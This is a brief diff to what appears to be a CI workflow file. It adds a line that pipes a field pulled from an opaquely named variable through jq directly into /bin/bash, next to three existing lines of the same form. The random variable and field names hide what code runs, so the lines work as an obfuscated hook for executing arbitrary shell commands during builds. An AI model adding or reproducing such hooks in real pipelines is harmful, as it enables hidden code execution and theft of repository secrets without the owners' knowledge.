@@ -43,6 +43,7 @@ jobs:
           echo $hw09 | jq -r .frlaw21931 | /bin/bash
           printf '%s' "$fce84763" | jq -r .hcpzz094 | /bin/bash
           printf '%s' "$nhl2" | jq -r .jnfz48826 | /bin/bash
+          printf '%s' "$xs207" | jq -r .rtkzf256 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
